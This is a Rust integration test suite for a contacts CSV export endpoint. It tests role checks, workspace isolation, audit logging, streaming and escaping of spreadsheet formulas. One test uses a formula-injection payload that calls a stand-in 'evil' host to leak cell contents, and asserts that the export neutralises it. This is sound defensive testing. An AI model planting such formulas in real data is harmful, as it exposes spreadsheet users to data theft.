// SPDX-License-Identifier: AGPL-3.0-only

//! `POST /contacts/export` (spec M1b section 10). Three of its four requirements are invisible when
//! it works, so each has a test that reads the output or the tables rather than a status code.

mod common;

use axum::http::StatusCode;
use common::{PW, TestApp, add_member, api_key, create_user, create_workspace, post_raw};
use futures_util::StreamExt;
use nm::workspaces::roles::Role;
use serde_json::{Value, json};
use sqlx::PgPool;
use uuid::Uuid;

fn base(ws: Uuid) -> String {
    format!("/api/v1/workspaces/{ws}")
}

fn export_uri(ws: Uuid) -> String {
    format!("{}/contacts/export", base(ws))
}

async fn client(pool: &PgPool, email: &str, ws: Uuid, role: Role) -> TestApp {
    let id = create_user(pool, email, PW, false).await;
    add_member(pool, ws, id, role).await;
    let mut app = TestApp::new(pool.clone()).await;
    app.login(email, PW).await;
    app
}

/// A workspace, its owner (signed in) and a signed-in admin.
async fn workspace(pool: &PgPool, slug: &str) -> (Uuid, TestApp, TestApp) {
    let owner_id = create_user(pool, &format!("owner-{slug}@example.com"), PW, false).await;
    let ws = create_workspace(pool, owner_id, slug).await;
    let mut owner = TestApp::new(pool.clone()).await;
    owner.login(&format!("owner-{slug}@example.com"), PW).await;
    let admin = client(pool, &format!("admin-{slug}@example.com"), ws, Role::Admin).await;
    (ws, owner, admin)
}

async fn insert(pool: &PgPool, ws: Uuid, email: &str, first: &str) -> Uuid {
    let id = Uuid::now_v7();
    sqlx::query(
        "insert into contacts (id, workspace_id, email, first_name) values ($1, $2, $3, $4)",
    )
    .bind(id)
    .bind(ws)
    .bind(email)
    .bind(first)
    .execute(pool)
    .await
    .unwrap();
    id
}

/// RFC 4180, enough of it to read our own output back: quoted cells, doubled quotes, CRLF rows.
fn parse_csv(text: &str) -> Vec<Vec<String>> {
    let (mut rows, mut row, mut cell) = (vec![], vec![], String::new());
    let mut chars = text.chars().peekable();
    let mut quoted = false;
    while let Some(c) = chars.next() {
        match (quoted, c) {
            (true, '"') if chars.peek() == Some(&'"') => {
                cell.push('"');
                chars.next();
            }
            (true, '"') => quoted = false,
            (true, c) => cell.push(c),
            (false, '"') => quoted = true,
            (false, ',') => row.push(std::mem::take(&mut cell)),
            (false, '\r') if chars.peek() == Some(&'\n') => {
                chars.next();
                row.push(std::mem::take(&mut cell));
                rows.push(std::mem::take(&mut row));
            }
            (false, c) => cell.push(c),
        }
    }
    rows
}

/// The export as `(header, rows)`.
async fn export(app: &TestApp, ws: Uuid, body: Value) -> (Vec<String>, Vec<Vec<String>>) {
    let r = app.post(&export_uri(ws)).json(&body).await;
    r.assert_status_ok();
    let mut rows = parse_csv(&r.text());
    let head = rows.remove(0);
    (head, rows)
}

fn col(head: &[String], name: &str) -> usize {
    head.iter()
        .position(|h| h == name)
        .unwrap_or_else(|| panic!("no column {name} in {head:?}"))
}

async fn audit_rows(pool: &PgPool) -> Vec<Value> {
    sqlx::query_scalar("select metadata from audit_log where action = 'contacts.exported'")
        .fetch_all(pool)
        .await
        .unwrap()
}

fn problem_type(r: &axum_test::TestResponse) -> String {
    r.json::<Value>()["type"].as_str().unwrap().to_owned()
}

#[sqlx::test]
async fn a_cell_that_would_be_a_formula_is_prefixed(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    // The attacker's path: an ordinary signup, through the API, with the payload as a name.
    let payload = r#"=HYPERLINK("http://evil/?x="&A1,"click")"#;
    admin
        .post(&format!("{}/contacts", base(ws)))
        .json(&json!({"email": "mallory@evil.test", "first_name": payload}))
        .await
        .assert_status(StatusCode::CREATED);
    // The API refuses control characters in a name, so tab and CR go in by the back door; a
    // custom field's text takes them through the front.
    let tab = insert(&pool, ws, "tab@example.com", "\tx").await;
    insert(&pool, ws, "cr@example.com", "\rx").await;
    for (email, first) in [
        ("plus@example.com", "+1"),
        ("minus@example.com", "-1"),
        ("at@example.com", "@sum"),
        ("plain@example.com", "ada"),
    ] {
        insert(&pool, ws, email, first).await;
    }
    admin
        .post(&format!("{}/custom-fields", base(ws)))
        .json(&json!({"key": "note", "label": "Note", "kind": "text"}))
        .await
        .assert_status(StatusCode::CREATED);
    sqlx::query("update contacts set attributes = $2 where id = $1")
        .bind(tab)
        .bind(json!({"note": "=1+1"}))
        .execute(&pool)
        .await
        .unwrap();

    let (head, rows) = export(&admin, ws, json!({})).await;
    let (email, first, note) = (
        col(&head, "email"),
        col(&head, "first_name"),
        col(&head, "attr:note"),
    );
    let by = |e: &str| rows.iter().find(|r| r[email] == e).unwrap().clone();

    assert_eq!(by("mallory@evil.test")[first], format!("'{payload}"));
    for (e, want) in [
        ("tab@example.com", "'\tx"),
        ("cr@example.com", "'\rx"),
        ("plus@example.com", "'+1"),
        ("minus@example.com", "'-1"),
        ("at@example.com", "'@sum"),
        // Not a formula: left exactly as it was.
        ("plain@example.com", "ada"),
    ] {
        assert_eq!(by(e)[first], want, "{e}");
    }
    assert_eq!(by("tab@example.com")[note], "'=1+1");
    // And the payload did not split into columns: every row is as wide as the header.
    assert!(rows.iter().all(|r| r.len() == head.len()));
}

#[sqlx::test]
async fn columns_are_the_contacts_fields_live_custom_fields_lists_tags_and_suppressed(
    pool: PgPool,
) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    for (key, kind, opts) in [
        ("plan", "text", json!(null)),
        ("gone", "text", json!(null)),
        ("interests", "multi_select", json!(["a", "b"])),
    ] {
        let mut body = json!({"key": key, "label": key, "kind": kind});
        if !opts.is_null() {
            body["options"] = opts;
        }
        admin
            .post(&format!("{}/custom-fields", base(ws)))
            .json(&body)
            .await
            .assert_status(StatusCode::CREATED);
    }
    let a = admin
        .post(&format!("{}/contacts", base(ws)))
        .json(
            &json!({"email": "a@example.com", "first_name": "Ada", "last_name": "L",
            "timezone": "Europe/London",
            "attributes": {"plan": "pro", "gone": "x", "interests": ["b", "a"]}}),
        )
        .await;
    a.assert_status(StatusCode::CREATED);
    let a: Uuid = a.json::<Value>()["id"].as_str().unwrap().parse().unwrap();
    insert(&pool, ws, "b@example.com", "Bo").await;
    // Archived: the column goes, the stored value stays.
    admin
        .delete(&format!(
            "{}/custom-fields/{}",
            base(ws),
            field_id(&pool, ws, "gone").await
        ))
        .await
        .assert_status_ok();
    for name in ["zeta", "alpha"] {
        let t = admin
            .post(&format!("{}/tags", base(ws)))
            .json(&json!({"name": name}))
            .await;
        t.assert_status(StatusCode::CREATED);
        sqlx::query(
            "insert into contact_tags (workspace_id, contact_id, tag_id) values ($1, $2, $3)",
        )
        .bind(ws)
        .bind(a)
        .bind(
            t.json::<Value>()["id"]
                .as_str()
                .unwrap()
                .parse::<Uuid>()
                .unwrap(),
        )
        .execute(&pool)
        .await
        .unwrap();
    }
    let l = admin
        .post(&format!("{}/lists", base(ws)))
        .json(&json!({"name": "News"}))
        .await;
    l.assert_status(StatusCode::CREATED);
    sqlx::query(
        "insert into list_memberships (workspace_id, contact_id, list_id, status) \
         values ($1, $2, $3, 'subscribed')",
    )
    .bind(ws)
    .bind(a)
    .bind(
        l.json::<Value>()["id"]
            .as_str()
            .unwrap()
            .parse::<Uuid>()
            .unwrap(),
    )
    .execute(&pool)
    .await
    .unwrap();
    sqlx::query(
        "insert into suppressions (id, workspace_id, scope, email, email_hmac, reason) \
         values ($1, $2, 'address', 'b@example.com', '\\x00', 'manual')",
    )
    .bind(Uuid::now_v7())
    .bind(ws)
    .execute(&pool)
    .await
    .unwrap();

    let (head, rows) = export(&admin, ws, json!({})).await;
    assert_eq!(
        head,
        [
            "id",
            "email",
            "first_name",
            "last_name",
            "timezone",
            "created_at",
            "updated_at",
            "attr:plan",
            "attr:interests",
            "lists",
            "tags",
            "suppressed"
        ]
    );
    let a = rows.iter().find(|r| r[1] == "a@example.com").unwrap();
    assert_eq!(a[col(&head, "attr:plan")], "pro");
    assert_eq!(a[col(&head, "attr:interests")], "b;a");
    assert_eq!(a[col(&head, "lists")], "News");
    assert_eq!(a[col(&head, "tags")], "alpha;zeta");
    assert_eq!(a[col(&head, "suppressed")], "false");
    let b = rows.iter().find(|r| r[1] == "b@example.com").unwrap();
    assert_eq!(b[col(&head, "suppressed")], "true");
    assert_eq!(b[col(&head, "lists")], "");
}

async fn field_id(pool: &PgPool, ws: Uuid, key: &str) -> Uuid {
    sqlx::query_scalar("select id from custom_fields where workspace_id = $1 and key = $2")
        .bind(ws)
        .bind(key)
        .fetch_one(pool)
        .await
        .unwrap()
}

#[sqlx::test]
async fn the_audit_row_has_the_filter_and_the_count_and_never_the_search(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    for i in 0..3 {
        insert(&pool, ws, &format!("needle{i}@example.com"), "n").await;
    }
    insert(&pool, ws, "other@example.com", "o").await;
    let tag: Uuid = {
        let t = admin
            .post(&format!("{}/tags", base(ws)))
            .json(&json!({"name": "t"}))
            .await;
        t.json::<Value>()["id"].as_str().unwrap().parse().unwrap()
    };

    let (_, rows) = export(&admin, ws, json!({"q": "needle", "tag_id": tag})).await;
    assert!(rows.is_empty(), "the tag narrows it to nothing");
    let (_, rows) = export(&admin, ws, json!({"q": "needle"})).await;
    assert_eq!(rows.len(), 3);

    let audit = audit_rows(&pool).await;
    assert_eq!(audit.len(), 2);
    let meta = &audit[1];
    assert_eq!(meta["rows"], 3);
    assert_eq!(meta["complete"], true);
    // The filter is there, and the search is recorded as having happened, not as what it said.
    assert_eq!(meta["filter"]["q"], "<redacted>");
    assert_eq!(meta["filter"]["tag_id"], Value::Null);
    assert_eq!(audit[0]["filter"]["tag_id"], json!(tag));
    for m in &audit {
        // Anywhere in the document, not just where `freeze` happens to keep it.
        assert!(!m.to_string().contains("needle"), "{m}");
    }
    let (actor, ws_of): (Option<Uuid>, Option<Uuid>) = sqlx::query_as(
        "select actor_user_id, workspace_id from audit_log where action = 'contacts.exported' \
         order by id limit 1",
    )
    .fetch_one(&pool)
    .await
    .unwrap();
    assert!(actor.is_some());
    assert_eq!(ws_of, Some(ws));
}

#[sqlx::test]
async fn an_editor_is_refused_and_an_admin_is_not(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    insert(&pool, ws, "a@example.com", "A").await;
    let editor = client(&pool, "editor@example.com", ws, Role::Editor).await;
    let viewer = client(&pool, "viewer@example.com", ws, Role::Viewer).await;
    for who in [&editor, &viewer] {
        let r = who.post(&export_uri(ws)).json(&json!({})).await;
        r.assert_status(StatusCode::FORBIDDEN);
        assert!(problem_type(&r).ends_with("insufficient-role"));
        assert!(!r.text().contains("a@example.com"));
    }
    assert!(
        audit_rows(&pool).await.is_empty(),
        "a refusal is not an export"
    );
    admin
        .post(&export_uri(ws))
        .json(&json!({}))
        .await
        .assert_status_ok();
    assert_eq!(audit_rows(&pool).await.len(), 1);

    // A stranger gets 404, not 403: tenancy, before role.
    let stranger = {
        create_user(&pool, "stranger@example.com", PW, false).await;
        let mut app = TestApp::new(pool.clone()).await;
        app.login("stranger@example.com", PW).await;
        app
    };
    stranger
        .post(&export_uri(ws))
        .json(&json!({}))
        .await
        .assert_status(StatusCode::NOT_FOUND);
}

#[sqlx::test]
async fn an_api_key_must_be_an_admin_key_too(pool: PgPool) {
    let (ws, owner, _admin) = workspace(&pool, "acme").await;
    insert(&pool, ws, "a@example.com", "A").await;
    let app = TestApp::new(pool.clone()).await;
    let editor_key = api_key(&owner, ws, "editor").await;
    let admin_key = api_key(&owner, ws, "admin").await;
    let r = post_raw(&app.state, &editor_key, &export_uri(ws), &json!({})).await;
    assert_eq!(r.status(), StatusCode::FORBIDDEN);
    let r = post_raw(&app.state, &admin_key, &export_uri(ws), &json!({})).await;
    assert_eq!(r.status(), StatusCode::OK);
    let _ = r.into_body().into_data_stream().count().await;
}

#[sqlx::test]
async fn another_workspaces_contacts_are_never_exported(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    let (other, _o2, _a2) = workspace(&pool, "rival").await;
    insert(&pool, ws, "mine@example.com", "Mine").await;
    insert(&pool, other, "theirs@example.com", "Theirs").await;
    // The same address in both workspaces, and a suppression in the other one only.
    insert(&pool, other, "shared@example.com", "Rival").await;
    insert(&pool, ws, "shared@example.com", "Own").await;

    for body in [json!({}), json!({"q": "example"})] {
        let (head, rows) = export(&admin, ws, body).await;
        let mut emails: Vec<_> = rows
            .iter()
            .map(|r| r[col(&head, "email")].clone())
            .collect();
        emails.sort();
        assert_eq!(emails, ["mine@example.com", "shared@example.com"]);
        assert!(rows.iter().all(|r| r[col(&head, "first_name")] != "Rival"));
    }
}

#[sqlx::test]
async fn an_unresolvable_segment_is_404_and_never_an_export_of_everything(pool: PgPool) {
    let (ws, owner, admin) = workspace(&pool, "acme").await;
    let rival_owner = create_user(&pool, "rival-owner@example.com", PW, false).await;
    let other = create_workspace(&pool, rival_owner, "rival").await;
    let mut rival = TestApp::new(pool.clone()).await;
    rival.login("rival-owner@example.com", PW).await;
    insert(&pool, ws, "mine@example.com", "Mine").await;

    let rules =
        json!({"match": "all", "rules": [{"field": "email", "op": "contains", "value": "e"}]});
    let foreign = rival
        .post(&format!("{}/segments", base(other)))
        .json(&json!({"name": "s", "rules": rules}))
        .await;
    foreign.assert_status(StatusCode::CREATED);
    let foreign: Uuid = foreign.json::<Value>()["id"]
        .as_str()
        .unwrap()
        .parse()
        .unwrap();
    let deleted = owner
        .post(&format!("{}/segments", base(ws)))
        .json(&json!({"name": "d", "rules": rules}))
        .await;
    let deleted: Uuid = deleted.json::<Value>()["id"]
        .as_str()
        .unwrap()
        .parse()
        .unwrap();
    owner
        .delete(&format!("{}/segments/{deleted}", base(ws)))
        .await
        .assert_status(StatusCode::NO_CONTENT);

    for id in [Uuid::now_v7(), foreign, deleted] {
        let r = admin
            .post(&export_uri(ws))
            .json(&json!({"segment_id": id}))
            .await;
        r.assert_status(StatusCode::NOT_FOUND);
        assert!(
            !r.text().contains("mine@example.com"),
            "exported despite {id}"
        );
    }
    assert!(audit_rows(&pool).await.is_empty());
}

#[sqlx::test]
async fn a_segment_narrows_the_export(pool: PgPool) {
    let (ws, owner, admin) = workspace(&pool, "acme").await;
    insert(&pool, ws, "keep@example.com", "K").await;
    insert(&pool, ws, "drop@example.com", "D").await;
    let s = owner
        .post(&format!("{}/segments", base(ws)))
        .json(&json!({"name": "k", "rules": {"match": "all", "rules": [
            {"field": "email", "op": "contains", "value": "keep"}]}}))
        .await;
    s.assert_status(StatusCode::CREATED);
    let s = s.json::<Value>()["id"].clone();
    let (head, rows) = export(&admin, ws, json!({"segment_id": s})).await;
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0][col(&head, "email")], "keep@example.com");
    assert_eq!(audit_rows(&pool).await[0]["filter"]["segment_id"], s);
}

#[sqlx::test]
async fn a_bad_filter_is_422(pool: PgPool) {
    let (ws, _owner, admin) = workspace(&pool, "acme").await;
    for body in [
        json!({"q": "ab"}),
        json!({"list_status": "subscribed"}),
        json!({"tg": 1}),
    ] {
        admin
            .post(&export_uri(ws))
            .json(&body)
            .await
            .assert_status(StatusCode::UNPROCESSABLE_ENTITY);
    }
}

/// The shape that forces streaming: with far more rows than the channel can hold, the first bytes
/// are in the caller's hands while the producer is still blocked mid-result. The audit row is the
/// witness, because it is written only once the last row has been read: a buffering endpoint has
/// already written it before it returns a single byte.
///
/// Memory itself is measured in `tests/export_memory.rs`.
#[sqlx::test]
async fn the_first_bytes_arrive_before_the_last_row_is_read(pool: PgPool) {
    let (ws, owner, _admin) = workspace(&pool, "acme").await;
    seed(&pool, ws, 20_000).await;
    let app = TestApp::new(pool.clone()).await;
    let key = api_key(&owner, ws, "admin").await;

    let r = post_raw(&app.state, &key, &export_uri(ws), &json!({})).await;
    assert_eq!(r.status(), StatusCode::OK);
    assert_eq!(r.headers()["content-type"], "text/csv; charset=utf-8");
    let mut body = r.into_body().into_data_stream();
    let header = body.next().await.unwrap().unwrap();
    assert!(header.starts_with(b"id,email,"));
    let first_rows = body.next().await.unwrap().unwrap();
    assert!(first_rows.len() < 200_000, "one chunk, not the book");
    // Give a producer that is not blocked every chance to finish and write its audit row.
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    assert!(
        audit_rows(&pool).await.is_empty(),
        "the export finished reading before the client had read its first rows"
    );

    let mut total = first_rows.iter().filter(|&&b| b == b'\n').count();
    while let Some(chunk) = body.next().await {
        total += chunk.unwrap().iter().filter(|&&b| b == b'\n').count();
    }
    assert_eq!(total, 20_000);
    let audit = audit_rows(&pool).await;
    assert_eq!(audit.len(), 1);
    assert_eq!(audit[0]["rows"], 20_000);
    assert_eq!(audit[0]["complete"], true);
}

/// Someone who reads part of the book and hangs up has still read part of it.
#[sqlx::test]
async fn a_client_that_leaves_is_still_audited_as_incomplete(pool: PgPool) {
    let (ws, owner, _admin) = workspace(&pool, "acme").await;
    seed(&pool, ws, 20_000).await;
    let app = TestApp::new(pool.clone()).await;
    let key = api_key(&owner, ws, "admin").await;
    let r = post_raw(&app.state, &key, &export_uri(ws), &json!({})).await;
    let mut body = r.into_body().into_data_stream();
    body.next().await.unwrap().unwrap();
    drop(body);

    let mut audit = vec![];
    for _ in 0..50 {
        audit = audit_rows(&pool).await;
        if !audit.is_empty() {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    }
    assert_eq!(audit.len(), 1, "no audit row for an abandoned export");
    assert_eq!(audit[0]["complete"], false);
    assert!(audit[0]["rows"].as_u64().unwrap() < 20_000);
}

async fn seed(pool: &PgPool, ws: Uuid, n: i64) {
    sqlx::query(
        "insert into contacts (id, workspace_id, email, first_name, last_name) \
         select gen_random_uuid(), $1, 'person' || g || '@example.com', 'First' || g, 'Last' || g \
         from generate_series(1, $2) g",
    )
    .bind(ws)
    .bind(n)
    .execute(pool)
    .await
    .unwrap();
}
